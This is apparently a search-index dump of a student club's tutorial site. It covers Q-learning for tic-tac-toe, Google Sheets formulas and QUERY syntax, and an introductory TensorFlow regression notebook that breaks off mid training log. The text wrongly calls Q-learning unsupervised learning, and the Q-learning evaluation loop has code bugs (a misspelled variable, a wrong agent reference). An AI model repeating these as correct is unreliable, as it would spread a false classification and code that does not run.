agent2.get_action(obs[\"board\"])\n\n\nenv.reset()\nenv.run([run_agent1, run_agent2]) # Run the AI's against themselves\nenv.render(mode = \"ipython\")\n</pre> def run_agent1(obs): # Create a function to extract the board from the environment and get the coresponding action     return agent1.get_action(obs[\"board\"]) def run_agent2(obs): # Create a function to extract the board from the environment and get the coresponding action     return agent2.get_action(obs[\"board\"])   env.reset() env.run([run_agent1, run_agent2]) # Run the AI's against themselves env.render(mode = \"ipython\") <p>We can now run the new AI against the old trainer and see the results.</p> In\u00a0[\u00a0]: Copied! <pre>trainer = env.train([None, \"reaction\"]) # train against 'reaction' or 'random' agent\nrewards = []\nfor episode_no in range(100):\n    episode_reward = 0\n    \n    obs = trainer.reset() # Reset the board\n    done = False # Checks if the game has ended\n    while not done:\n        action = agent1.get_action(obs['board']) # get an action from the agent\n        \n        past_board = obs['board'].copy()\n        \n        obs, reward, done, info = trainer.step(action) # Play the move and get the reward\n        episode_reward += reward\n        agent1.update_q_table(past_board, action, obs['board'], reward) # Tells the AI to learn based on the reward\n        \n        if episode_no &gt;= deacy_after:\n            agent.epsilon *= agent.decay # Decay epsilon\n    \n    rewards.append(reward)\n\nprint(f\"The new mean score is {np.mean(rewards)}.\")\nprint(f\"Wins : {rewards.count(1)}, Draws : {rewards.count(0)}, Losses : {rewards.count(-1)}\")\n</pre>  trainer = env.train([None, \"reaction\"]) # train against 'reaction' or 'random' agent rewards = [] for episode_no in range(100):     episode_reward = 0          obs = trainer.reset() # Reset the board     done = False # Checks if the game has ended     while not done:         action = agent1.get_action(obs['board']) # get an action from the agent                  past_board = obs['board'].copy()                  obs, reward, done, info = trainer.step(action) # Play the move and get the reward         episode_reward += reward         agent1.update_q_table(past_board, action, obs['board'], reward) # Tells the AI to learn based on the reward                  if episode_no &gt;= deacy_after:             agent.epsilon *= agent.decay # Decay epsilon          rewards.append(reward)  print(f\"The new mean score is {np.mean(rewards)}.\") print(f\"Wins : {rewards.count(1)}, Draws : {rewards.count(0)}, Losses : {rewards.count(-1)}\") <pre>The new mean score is -0.49.\nWins : 13, Draws : 25, Losses : 62\n</pre>"},{"location":"2022-2023/05_Q_Learning/#introduction-to-q-learning","title":"Introduction to Q-Learning\u00b6","text":""},{"location":"2022-2023/05_Q_Learning/#1-what-is-q-learning","title":"1. What is Q-learning?\u00b6","text":""},{"location":"2022-2023/05_Q_Learning/#11-definition","title":"1.1 Definition\u00b6","text":"<p>Q-learning is an unsupervised learning technique where an AI will interact with a given environment and over time, will learn the optimal actions it can take in this environment.</p>"},{"location":"2022-2023/05_Q_Learning/#12-advantages-of-q-learning","title":"1.2 Advantages of Q-learning\u00b6","text":"<ol> <li>Q-learning is one of a few types of learning that can cause the AI to consider the future impacts of it's actions and not just the short-term gains.</li> <li>As this is an unsupervised learning technique, we do not need to have any idea of how to solve the problem. So long as we can define what outcomes are favorable and not favorable, the model can learn by itself.</li> <li>Even if we can solve a task (like tic-tac-toe for example) using traditional AI, q-learning models run incredibly fast once trained and will take a fraction of the computational power to run.</li> </ol>"},{"location":"2022-2023/05_Q_Learning/#2-fundamental-building-blocks","title":"2. Fundamental Building Blocks\u00b6","text":"<p>To successfully implement q-learning to solve a problem, we need the following things:</p> <ol> <li>Observation Space  This is the way we define the current state of the environment. This     is      normally an array of numbers with upper and lower bounds for each number.</li> <li>Action Space How many actions the agent can take at any given state. Note that the actions being taken do not matter here, we only care about how many distinct actions can be taken.</li> <li>Reward Function This function is used to evaluate the actions of the agent. More specifically, the agent will take an action and this function will return the 'reward' of this action. This reward is a number that indicates how good or bad an action is. The agent will always try to optimize for the highest reward value possible.</li> </ol>"},{"location":"2022-2023/05_Q_Learning/#3-our-environment","title":"3. Our Environment\u00b6","text":"<p>Today we will be using the common game of tic-tac-toe to demonstrate q-learning. The kaggle environments library has an inbuilt environment with an inbuilt GUI and so we will begin by using this environment. Let us begin by exploring the basics of this environment.</p>"},{"location":"2022-2023/05_Q_Learning/#31-environment-specifications","title":"3.1 Environment Specifications\u00b6","text":"<p>Below we can see the environment's observation and action spaces.</p>"},{"location":"2022-2023/05_Q_Learning/#32-environment-players-and-gui","title":"3.2 Environment Players and GUI\u00b6","text":"<p>This environment also has some inbuilt players that play the game. We can set this to 'random' or 'reaction'. The 'random' player makes completely random moves whereas the 'reaction' player makes better but suboptimal plays. The goal of our AI is to be able to outperform both of these players.   To utilize the GUI of this library we need to specify two players and it will create a visualization of the game based on the actions of the respective players.</p>"},{"location":"2022-2023/05_Q_Learning/#4-the-q-learning-model","title":"4. The Q-Learning Model\u00b6","text":""},{"location":"2022-2023/05_Q_Learning/#41-basics-of-q-learning","title":"4.1 Basics of Q-learning\u00b6","text":"<p>Q-learning takes a simple yet powerful approach to learning from an environment. We can break this process down into these steps: </p> <ol> <li>Create a dictionary that maps observations to an array of action scores.</li> <li>Observe the environment.</li> <li>If we have seen this state before, perform the action with the highest score. Otherwise take a random action.</li> <li>Look at the feedback (reward).</li> <li>If the reward is positive this action will be encouraged when we see this state again. If not, the action is discouraged.</li> <li>Store the observations and their corresponding action values (also known as q-values) in the dictionary.</li> <li>Repeat the steps 2 - 6.</li> <li>Additionally with a probability of epsilon, take a random action instead of the action with the highest value. This is done to encourage the model to try new approaches to the problem and potentially discover better solutions.</li> </ol>"},{"location":"2022-2023/05_Q_Learning/#42-hyper-parameters","title":"4.2 Hyper-Parameters\u00b6","text":"<p>The AI is created with the following parameters that dictate various aspects of it's learning process.</p> <ol> <li>Epsilon : This is a number between 0 and 1. It is the probability that the agent will take random actions in order to try new approaches. We often decay this value over time since the model should be getting better after it has already tried many different actions.</li> <li>Decay : This is the rate by which epsilon will decay over time. The exact formula for this is</li> </ol> <pre><code>epsilon = epsilon * decay_rate\n</code></pre> <p>This value must be between 0 and 1. 3. Alpha : This is the learning rate of the model. It determines how quickly the agent will learn from new information. The ideal learning rate will allow the AI to learn fast enough to be useful, but not so fast that it instantly discards previous information. This must be a positive number. 4. Discount : This is the percentage of weightage the AI gives to potential future rewards vs current rewards.</p>"},{"location":"2022-2023/05_Q_Learning/#43-putting-it-all-together","title":"4.3 Putting it all together\u00b6","text":"<p>The final step to completing the AI is to define how it will learn from a reward. This is done by adding the current rewards and potential future rewards the AI can achieve.</p> <p>The current reward is simply the q-value of that action.</p> <p>The future reward is calculated using a combination of the largest q-value of the environment state after this action has been taken as well as all of our hyper-parameters.</p> <p>Below is an illustration of this equation.</p>"},{"location":"2022-2023/05_Q_Learning/#44-running-the-training-loop","title":"4.4 Running the Training Loop\u00b6","text":""},{"location":"2022-2023/05_Q_Learning/#45-evaluating-the-performance","title":"4.5 Evaluating the Performance\u00b6","text":""},{"location":"2022-2023/05_Q_Learning/#5-alternate-method-to-train-our-ai","title":"5. Alternate Method to Train our AI\u00b6","text":"<p>The previous AI relied on the fact that we have an existing program it can play against.</p> <p>A potential way to achieve a different (and potentially better) AI is to simply create two AI's and train them by having them play multiple games against each other. This will allow us to learn without any pre-existing program that we can run against.</p> <p>Note that this method takes exponentially longer to train. Infact, even in the demo given below these AI's play 50,000 games against each other but have not reached the level of the first AI. This is because we need to first train them to learn the game properly which in and of itself can take millions of episodes of training. As we will see, it is far better to have even a rudimentary program which we can play against in order to learn.</p>"},{"location":"2022-2023/06_Google_Sheets/","title":"Google Sheets","text":"<p>Web-based and collaboration-oriented spreadsheet program, part of Google's suite of products.</p> <p>Organized by Ahmed Thahir</p>"},{"location":"2022-2023/06_Google_Sheets/#recording","title":"Recording","text":"<p>Watch the Recording</p>"},{"location":"2022-2023/06_Google_Sheets/#event-spreadsheet","title":"Event Spreadsheet","text":"<p>Open and explore the Google Sheet created for this event!</p>"},{"location":"2022-2023/06_Google_Sheets/#why-not-use-spreadsheets","title":"Why not use spreadsheets?","text":"<ul> <li>Faster</li> <li>Data and analysis are separate</li> <li>Automate analysis</li> <li>Reproducibility</li> <li>Python is open-source, hence the analysis is open-source</li> </ul>"},{"location":"2022-2023/06_Google_Sheets/#number-formatting","title":"Number Formatting","text":"<p><pre><code>#,##0; [red]#,##0; -\n</code></pre> +ve numbers usual -ve numbes red 0 as -</p>"},{"location":"2022-2023/06_Google_Sheets/#cell-formatting","title":"Cell Formatting","text":"<p>Conditional Formatting for Empty Alternating Colors for Rows Enhances legibility</p>"},{"location":"2022-2023/06_Google_Sheets/#formulae","title":"Formulae","text":""},{"location":"2022-2023/06_Google_Sheets/#value-in-nth-row","title":"Value in \\(n^{th}\\) row","text":"<pre><code>=INDEX(Payable!A2:A100, 5)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#value-in-last-row","title":"Value in Last Row","text":"<pre><code>=INDEX(Payable!A2:A, COUNTA(Payable!A2:A))\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#automatic-numbering","title":"Automatic Numbering","text":"<pre><code>=ARRAYFORMULA( if( ISBLANK(B2:B100), , row(B2:B100)-1 ) )\n\n=ARRAYFORMULA( if( ISBLANK(B4:B100), , row(B4:B100)-3 ) )\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#autofill-particular-word","title":"Autofill Particular Word","text":"<pre><code>=ARRAYFORMULA( if(ISBLANK(C2:C100), \"-\", \"Al Quoz\") )\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#natural-join","title":"Natural Join","text":"<p>Uses  <code>VLOOKUP</code></p> <pre><code>= VLOOKUP(look_for_range, look_in_range, columns, sorted_always_FALSE)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#single-column","title":"Single Column","text":"<pre><code>=ARRAYFORMULA(if( ISBLANK(C2:C100), \"-\",\n    VLOOKUP(C2:C100,'Student Details'!$A$2:$B100, 2, FALSE)\n))\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#multiple-columns","title":"Multiple Columns","text":"<p>Make sure that the look_in_range is correct size</p> <pre><code>=ARRAYFORMULA(if( ISBLANK(C2:C100), \"-\",\n    VLOOKUP(C2:C100,'Student Details'!$A$2:$D100, {2, 3, 4}, FALSE)\n))\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#count-number-of-capitalsmall-letters","title":"Count number of capital/small letters","text":""},{"location":"2022-2023/06_Google_Sheets/#capital","title":"Capital","text":"<pre><code>=SUMPRODUCT(LEN(E3)-LEN(SUBSTITUTE(E3,CHAR(ROW(INDIRECT(\"65:90\"))),\"\")))\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#small","title":"Small","text":"<pre><code>=SUMPRODUCT(LEN(E3)-LEN(SUBSTITUTE(E3,CHAR(ROW(INDIRECT(\"97:122\"))),\"\")))\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#import-data-from-another-sheet","title":"Import Data from another sheet","text":"<pre><code>=ImportRange(\"1WsMosP6WaifrDsTaMuZUlEP8MSYP1nfTyKh9x7q4ads\",\"Student_Details!B2:B200\")\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#check-if-value-in-another-column-not-in-of-sql","title":"Check if value in another column / <code>not in</code> of sql","text":"<pre><code>=ARRAYFORMULA(IF(ISBLANK(F2:F), ,\n    NOT(\n        IFERROR(\n            MATCH(J2:J, I2:I, 0)/MATCH(J2:J, I2:I, 0),\n            0\n        )\n    )\n    )\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#functionality","title":"Functionality","text":"<p>Dropdown</p> <p>Data Validation &gt; List</p>"},{"location":"2022-2023/06_Google_Sheets/#automatic-checkboxes","title":"Automatic Checkboxes","text":"<p>Data Validation &gt; Checkboxes</p>"},{"location":"2022-2023/06_Google_Sheets/#query","title":"Query","text":"<p>Quite similar to mySQL</p>"},{"location":"2022-2023/06_Google_Sheets/#tips","title":"Tips","text":"<ul> <li>Put <code>where col is not null</code> whenever possible to prevent crashes (due to too many blank values)</li> <li>Use only required columns in the input_range</li> <li>Use fixed ranges</li> </ul>"},{"location":"2022-2023/06_Google_Sheets/#basic","title":"Basic","text":"<pre><code>=QUERY(People!A2:Z, \"\nselect B\nwhere B is not null\n\")\n\n## or (better way)\n\n=QUERY(QUERY(People!A2:Z), \"\nselect Col2\nwhere Col2 is not null\n\")\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#labels","title":"Labels","text":"<pre><code>=QUERY(QUERY(People!A2:Z), \"\nselect Col2\nwhere Col2 is not null\nlabel Col2 'Roles'\n\")\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#distinct","title":"Distinct","text":"<pre><code>=UNIQUE(\nQUERY(QUERY(People!A2:Z), \"\nselect Col2\nwhere Col2 is not null\n\"))\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#sorting","title":"Sorting","text":"<pre><code>=QUERY(QUERY(Teams!A2:Z), \"\nselect Col2, count(Col2)\nwhere Col2 is not null\ngroup by Col2\norder by count(Col2) desc\n\")\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#double-grouping","title":"Double Grouping","text":"<pre><code>=QUERY(QUERY(Teams!A2:Z), \"\nselect C, B, count(B)\nwhere C is not null and B is not null\ngroup by C, B\norder by count(B) desc\n\")\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#rounding","title":"Rounding","text":"<pre><code>=QUERY(\nD2:E,\n\"select 10/3 format 10/3 '#.#' \"\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#calculating","title":"Calculating %","text":"<p>This query will automatically multiply with 100</p> <pre><code>=QUERY(\nD2:E,\n\"select 10/3 format '#.## %' \"\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#using-cell-as-value","title":"Using Cell as value","text":""},{"location":"2022-2023/06_Google_Sheets/#number","title":"Number","text":"<pre><code>=QUERY(\nD2:E,\n\"select 10/\"&amp;E2&amp;\"\"\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#text","title":"Text","text":"<p>Has <code>'</code> around the <code>\"</code></p> <pre><code>=QUERY(\nD2:E,\n\"select '\"&amp;E2&amp;\"'\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#subquery","title":"Subquery","text":"<pre><code>=QUERY(QUERY(People!B2:D, \"\nselect B, count(B)\nwhere B is not null\ngroup by D, B\nlabel B 'Important Divisions', count(B) 'Size'\n\"), \"\nselect Col1, avg(Col2), count(Col1)\nwhere Col1 is not null\ngroup by Col1 order by avg(Col2) desc\nlabel count(Col1) 'No of Teams', avg(Col2) 'Average Size'\n\")\n</code></pre> <pre><code>=QUERY(QUERY(People!B2:D, \"\nselect B, count(B) where B is not null group by D, B label B 'Important Division', count(B) 'Size'\"\n), \"\nselect Col1, count(Col2), avg(Col2), avg(Col2)/\"&amp;E2&amp;\", min(Col2)\nwhere Col1 is not null\ngroup by Col1\norder by count(Col2) desc, avg(Col2)/\"&amp;E2&amp;\" desc\nlabel min(Col2) 'Min Size', avg(Col2) 'Avg Size', avg(Col2)/\"&amp;E2&amp;\" 'Avg Size %', count(Col2) 'Teams having'\nformat avg(Col2)/\"&amp;E2&amp;\" '#.## %' \"\n          )\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#administrative-permission","title":"Administrative Permission","text":""},{"location":"2022-2023/06_Google_Sheets/#read-viewers","title":"Read (Viewers)","text":"<p>Set sharing settings of the entire gsheet as view only</p>"},{"location":"2022-2023/06_Google_Sheets/#read","title":"Read","text":"<p>Protect Sheet</p> <p>Description - Summary</p>"},{"location":"2022-2023/06_Google_Sheets/#readwriteupdate-lock-schema","title":"Read/Write/Update (Lock Schema)","text":"<p>Protect header row</p> <p>Description - Header</p>"},{"location":"2022-2023/06_Google_Sheets/#readupdate-not-createmodifydelete","title":"Read/Update (not create/modify/delete)","text":"<p>Create a blank column</p> <p>Protect the column from editing</p> <p>Description - Update Only</p> <p>Hide the column</p>"},{"location":"2022-2023/06_Google_Sheets/#dashboards","title":"Dashboards","text":"<p>Even Google Sheets can create dashboard</p> <p>Generate Charts by</p> <ul> <li>File &gt; Share &gt; Publish to Web</li> <li>Select what to include</li> </ul>"},{"location":"2022-2023/06_Google_Sheets/#import-into-python","title":"Import into Python","text":"<pre><code>url = \"\" ## excel publish link from google sheets\n</code></pre> <pre><code>sheet = pd.read_excel(\nurl,\nsheet_name = \"Not_Interviewed\",\nusecols = [\n\"Name\",\n\"Email\",\n\"Year\"\n]\n)\n\nsheet = pd.read_excel(\nurl,\nsheet_name = \"Interview_Summary\",\nheader = 2,\nusecols = [0, 3]\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#big-series-generation","title":"Big Series Generation","text":""},{"location":"2022-2023/06_Google_Sheets/#uni-hours-of-the-week","title":"Uni Hours of the week","text":"<pre><code>=FLATTEN(\nARRAYFORMULA(CONCAT(\"M\", TEXT(SEQUENCE(9), \"0\"))),\nARRAYFORMULA(CONCAT(\"T\", TEXT(SEQUENCE(9), \"0\"))),\nARRAYFORMULA(CONCAT(\"W\", TEXT(SEQUENCE(9), \"0\"))),\nARRAYFORMULA(CONCAT(\"Th\", TEXT(SEQUENCE(9), \"0\"))),\nARRAYFORMULA(CONCAT(\"F\", TEXT(SEQUENCE(9), \"0\")))\n)\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#regex","title":"Regex","text":"<pre><code>f20[0-9|A-Z]+@dubai.bits-pilani.ac.in\n</code></pre>"},{"location":"2022-2023/06_Google_Sheets/#web-scraping-using-google-sheets","title":"Web Scraping using [[Google Sheets]]","text":"<pre><code>=importxml(\n\"[Products. Nike SG](https://www.nike.com/sg/w/sale-3yaep\",)\n\"//div[@class='product-card__title']\"\n)\n</code></pre>"},{"location":"2022-2023/12_Tensorflow/","title":"Introduction to Tensorflow","text":"In\u00a0[\u00a0]: Copied! <pre>import tensorflow as tf # Tensorflow Import\nimport matplotlib.pyplot as plt # We use this to plot graphs\n</pre> import tensorflow as tf # Tensorflow Import import matplotlib.pyplot as plt # We use this to plot graphs In\u00a0[\u00a0]: Copied! <pre>housing_train_data, housing_test_data = tf.keras.datasets.boston_housing.load_data()\n\nhousing_train_x, housing_train_y = housing_train_data\n\nhousing_test_x, housing_test_y = housing_test_data\n</pre> housing_train_data, housing_test_data = tf.keras.datasets.boston_housing.load_data()  housing_train_x, housing_train_y = housing_train_data  housing_test_x, housing_test_y = housing_test_data In\u00a0[\u00a0]: Copied! <pre>print(housing_train_x.shape, housing_train_y.shape, housing_test_x.shape, housing_test_y.shape)\n</pre> print(housing_train_x.shape, housing_train_y.shape, housing_test_x.shape, housing_test_y.shape) <pre>(404, 13) (404,) (102, 13) (102,)\n</pre> In\u00a0[\u00a0]: Copied! <pre>import os\nos.environ['TF_DETERMINISTIC_OPS'] = '1'\ntf.random.set_seed(1)\n\nhousing_model = tf.keras.models.Sequential()\n\nhousing_model.add(tf.keras.layers.Input(shape = (13, ) )) # this says that each input is a list of 13 numerical values\n\n# Hidden Layers\nhousing_model.add(tf.keras.layers.Dense(128, activation = tf.nn.relu))\nhousing_model.add(tf.keras.layers.Dense(64, activation = tf.nn.relu))\nhousing_model.add(tf.keras.layers.Dense(32, activation = tf.nn.relu))\n\n# This is the output layer. It's size must match the output shape. As we are only trying to predict a single number, we set this to be one.\nhousing_model.add(tf.keras.layers.Dense(1, activation = tf.nn.relu))\n\nhousing_model.summary()\n</pre> import os os.environ['TF_DETERMINISTIC_OPS'] = '1' tf.random.set_seed(1)  housing_model = tf.keras.models.Sequential()  housing_model.add(tf.keras.layers.Input(shape = (13, ) )) # this says that each input is a list of 13 numerical values  # Hidden Layers housing_model.add(tf.keras.layers.Dense(128, activation = tf.nn.relu)) housing_model.add(tf.keras.layers.Dense(64, activation = tf.nn.relu)) housing_model.add(tf.keras.layers.Dense(32, activation = tf.nn.relu))  # This is the output layer. It's size must match the output shape. As we are only trying to predict a single number, we set this to be one. housing_model.add(tf.keras.layers.Dense(1, activation = tf.nn.relu))  housing_model.summary() <pre>Model: \"sequential\"\n_________________________________________________________________\n Layer (type)                Output Shape              Param #   \n=================================================================\n dense (Dense)               (None, 128)               1792      \n                                                                 \n dense_1 (Dense)             (None, 64)                8256      \n                                                                 \n dense_2 (Dense)             (None, 32)                2080      \n                                                                 \n dense_3 (Dense)             (None, 1)                 33        \n                                                                 \n=================================================================\nTotal params: 12,161\nTrainable params: 12,161\nNon-trainable params: 0\n_________________________________________________________________\n</pre> In\u00a0[\u00a0]: Copied! <pre># Visulizing the model we created in an image\ntf.keras.utils.plot_model(housing_model)\n</pre> # Visulizing the model we created in an image tf.keras.utils.plot_model(housing_model) Out[\u00a0]: In\u00a0[\u00a0]: Copied! <pre>housing_model.compile(loss = 'mse', optimizer = tf.keras.optimizers.Adam(learning_rate = 0.001), metrics = ['mae'])\n</pre> housing_model.compile(loss = 'mse', optimizer = tf.keras.optimizers.Adam(learning_rate = 0.001), metrics = ['mae']) In\u00a0[\u00a0]: Copied! <pre>history = housing_model.fit(housing_train_x, housing_train_y, epochs = 200, batch_size = 32, \n                            validation_data = (housing_test_x, housing_test_y))\n</pre> history = housing_model.fit(housing_train_x, housing_train_y, epochs = 200, batch_size = 32,                              validation_data = (housing_test_x, housing_test_y)) <pre>Epoch 1/200\n13/13 [==============================] - 3s 20ms/step - loss: 158.8385 - mae: 9.6381 - val_loss: 95.7954 - val_mae: 7.8068\nEpoch 2/200\n13/13 [==============================] - 0s 6ms/step - loss: 76.3933 - mae: 6.3137 - val_loss: 65.9840 - val_mae: 6.0853\nEpoch 3/200\n13/13 [==============================] - 0s 6ms/step - loss: 65.9594 - mae: 5.7446 - val_loss: 66.3625 - val_mae: 6.0314\nEpoch 4/200\n13/13 [==============================] - 0s 5ms/step - loss: 62.5118 - mae: 5.5272 - val_loss: 74.6212 - val_mae: 6.8268\nEpoch 5/200\n13/13 [==============================] - 0s 7ms/step - loss: 74.0129 - mae: 6.4932 - val_loss: 69.1981 - val_mae: 6.3276\nEpoch 6/200\n13/13 [==============================] - 0s 6ms/step - loss: 59.4877 - mae: 5.2731 - val_loss: 60.4491 - val_mae: 5.7421\nEpoch 7/200\n13/13 [==============================] - 0s 6ms/step - loss: 57.2982 - mae: 5.2019 - val_loss: 64.5019 - val_mae: 5.7485\nEpoch 8/200\n13/13 [==============================] - 0s 6ms/step - loss: 55.2949 - mae: 5.2820 - val_loss: 60.4656 - val_mae: 5.5768\nEpoch 9/200\n13/13 [==============================] - 0s 7ms/step - loss: 54.4415 - mae: 5.0364 - val_loss: 59.9733 - val_mae: 5.9685\nEpoch 10/200\n13/13 [==============================] - 0s 9ms/step - loss: 55.4086 - mae: 5.2899 - val_loss: 61.1802 - val_mae: 5.5353\nEpoch 11/200\n13/13 [==============================] - 0s 8ms/step - loss: 52.3622 - mae: 5.1678 - val_loss: 70.7138 - val_mae: 6.0207\nEpoch 12/200\n13/13 [==============================] - 0s 9ms/step - loss: 54.7812 - mae: 5.1739 - val_loss: 60.4563 - val_mae: 5.5465\nEpoch 13/200\n13/13 [==============================] - 0s 10ms/step - loss: 51.1010 - mae: 4.9313 - val_loss: 56.2302 - val_mae: 5.8327\nEpoch 14/200\n13/13 [==============================] - 0s 8ms/step - loss: 54.6022 - mae: 5.4264 - val_loss: 50.6665 - val_mae: 5.1169\nEpoch 15/200\n13/13 [==============================] - 0s 7ms/step - loss: 49.1987 - mae: 4.8514 - val_loss: 49.9302 - val_mae: 5.1431\nEpoch 16/200\n13/13 [==============================] - 0s 8ms/step - loss: 44.1350 - mae: 4.6618 - val_loss: 54.3591 - val_mae: 5.6313\nEpoch 17/200\n13/13 [==============================] - 0s 11ms/step - loss: 44.7293 - mae: 4.5990 - val_loss: 47.4475 - val_mae: 4.9372\nEpoch 18/200\n13/13 [==============================] - 0s 8ms/step - loss: 48.6658 - mae: 5.1030 - val_loss: 45.9619 - val_mae: 4.8511\nEpoch 19/200\n13/13 [==============================] - 0s 16ms/step - loss: 44.6938 - mae: 4.7826 - val_loss: 50.4378 - val_mae: 5.1573\nEpoch 20/200\n13/13 [==============================] - 0s 19ms/step - loss: 42.7974 - mae: 4.5628 - val_loss: 48.9445 - val_mae: 5.0729\nEpoch 21/200\n13/13 [==============================] - 0s 16ms/step - loss: 40.4660 - mae: 4.4248 - val_loss: 44.1847 - val_mae: 4.7969\nEpoch 22/200\n13/13 [==============================] - 0s 16ms/step - loss: 42.0077 - mae: 4.5317 - val_loss: 49.4147 - val_mae: 5.4573\nEpoch 23/200\n13/13 [==============================] - 0s 16ms/step - loss: 42.6910 - mae: 4.5960 - val_loss: 45.0685 - val_mae: 5.0135\nEpoch 24/200\n13/13 [==============================] - 0s 12ms/step - loss: 43.0620 - mae: 4.8228 - val_loss: 69.4898 - val_mae: 6.1312\nEpoch 25/200\n13/13 [==============================] - 0s 13ms/step - loss: 45.0583 - mae: 4.8055 - val_loss: 50.0795 - val_mae: 5.6526\nEpoch 26/200\n13/13 [==============================] - 0s 13ms/step - loss: 39.8796 - mae: 4.6951 - val_loss: 47.7645 - val_mae: 5.4730\nEpoch 27/200\n13/13 [==============================] - 0s 12ms/step - loss: 40.4625 - mae: 4.6206 - val_loss: 66.1004 - val_mae: 6.0231\nEpoch 28/200\n13/13 [==============================] - 0s 11ms/step - loss: 44.0332 - mae: 4.8351 - val_loss: 41.6119 - val_mae: 4.7721\nEpoch 29/200\n13/13 [==============================] - 0s 11ms/step - loss: 37.6091 - mae: 4.3522 - val_loss: 43.1239 - val_mae: 4.9717\nEpoch 30/200\n13/13 [==============================] - 0s 9ms/step - loss: 40.1845 - mae: 4.7036 - val_loss: 46.3408 - val_mae: 4.7283\nEpoch 31/200\n13/13 [==============================] - 0s 9ms/step - loss: 40.7183 - mae: 4.3376 - val_loss: 71.5646 - val_mae: 7.3153\nEpoch 32/200\n13/13 [==============================] - 0s 10ms/step - loss: 44.9594 - mae: 5.0427 - val_loss: 47.3080 - val_mae: 5.1347\nEpoch 33/200\n13/13 [==============================] - 0s 7ms/step - loss: 36.1740 - mae: 4.2906 - val_loss: 37.3797 - val_mae: 4.3156\nEpoch 34/200\n13/13 [==============================] - 0s 7ms/step - loss: 35.1721 - mae: 4.2808 - val_loss: 43.5961 - val_mae: 5.1065\nEpoch 35/200\n13/13 [==============================] - 0s 9ms/step - loss: 42.3842 - mae: 4.6613 - val_loss: 39.9437 - val_mae: 4.6140\nEpoch 36/200\n13/13 [==============================] - 0s 14ms/step - loss: 34.9352 - mae: 4.2898 - val_loss: 36.6850 - val_mae: 4.3644\nEpoch 37/200\n13/13 [==============================] - 0s 8ms/step - loss: 37.5937 - mae: 4.5599 - val_loss: 46.0385 - val_mae: 4.8115\nEpoch 38/200\n13/13 [==============================] - 0s 7ms/step - loss: 38.6579 - mae: 4.5573 - val_loss: 54.7305 - val_mae: 5.7872\nEpoch 39/200\n13/13 [==============================] - 0s 15ms/step - loss: 39.0535 - mae: 4.5922 - val_loss: 36.8828 - val_mae: 4.3484\nEpoch 40/200\n13/13 [==============================] - 0s 10ms/step - loss: 32.1071 - mae: 4.1278 - val_loss: 36.2320 - val_mae: 4.4966\nEpoch 41/200\n13/13 [==============================] - 0s 10ms/step - loss: 31.5088 - mae: 4.0360 - val_loss: 36.7014 - val_mae: 4.1789\nEpoch 42/200\n13/13 [==============================] - 0s 10ms/step - loss: 29.2168 - mae: 3.8722 - val_loss: 35.3969 - val_mae: 4.1913\nEpoch 43/200\n13/13 [==============================] - 0s 13ms/step - loss: 32.2159 - mae: 4.1641 - val_loss: 36.9562 - val_mae: 4.2649\nEpoch 44/200\n13/13 [==============================] - 0s 9ms/step - loss: 29.7467 - mae: 3.9412 - val_loss: 36.2007 - val_mae: 4.1624\nEpoch 45/200\n13/13 [==============================] - 0s 14ms/step - loss: 28.2262 - mae: 3.8844 - val_loss: 34.9140 - val_mae: 4.3519\nEpoch 46/200\n13/13 [==============================] - 0s 10ms/step - loss: 27.3710 - mae: 3.8364 - val_loss: 39.7883 - val_mae: 4.3774\nEpoch 47/200\n13/13 [==============================] - 0s 14ms/step - loss: 27.0967 - mae: 3.7600 - val_loss: 34.0516 - val_mae: 4.3883\nEpoch 48/200\n13/13 [==============================] - 0s 10ms/step - loss: 25.9610 - mae: 3.7246 - val_loss: 31.9078 - val_mae: 4.1271\nEpoch 49/200\n13/13 [==============================] - 0s 10ms/step - loss: 27.8723 - mae: 3.9180 - val_loss: 34.9717 - val_mae: 4.1329\nEpoch 50/200\n13/13 [==============================] - 0s 10ms/step - loss: 32.7865 - mae: 4.1370 - val_loss: 36.5629 - val_mae: 4.7346\nEpoch 51/200\n13/13 [==============================] - 0s 9ms/step - loss: 31.7112 - mae: 4.0968 - val_loss: 35.9101 - val_mae: 4.2142\nEpoch 52/200\n13/13 [==============================] - 0s 9ms/step - loss: 31.5274 - mae: 4.0991 - val_loss: 35.5170 - val_mae: 4.6127\nEpoch 53/200\n13/13 [==============================] - 0s 9ms/step - loss: 35.3326 - mae: 4.3822 - val_loss: 36.5821 - val_mae: 4.2943\nEpoch 54/200\n13/13 [==============================] - 0s 10ms/step - loss: 28.3815 - mae: 3.9179 - val_loss: 31.7608 - val_mae: 4.0195\nEpoch 55/200\n13/13 [==============================] - 0s 8ms/step - loss: 26.7372 - mae: 3.7736 - val_loss: 31.3684 - val_mae: 3.9846\nEpoch 56/200\n13/13 [==============================] - 0s 15ms/step - loss: 27.3837 - mae: 4.0081 - val_loss: 31.9295 - val_mae: 4.1485\nEpoch 57/200\n13/13 [==============================] - 0s 5ms/step - loss: 23.7578 - mae: 3.5441 - val_loss: 32.2378 - val_mae: 4.0319\nEpoch 58/200\n13/13 [==============================] - 0s 10ms/step - loss: 23.5053 - mae: 3.5031 - val_loss: 31.2508 - val_mae: 4.0442\nEpoch 59/200\n13/13 [==============================] - 0s 13ms/step - loss: 23.4275 - mae: 3.5010 - val_loss: 31.8437 - val_mae: 4.1435\nEpoch 60/200\n13/13 [==============================] - 0s 10ms/step - loss: 21.5507 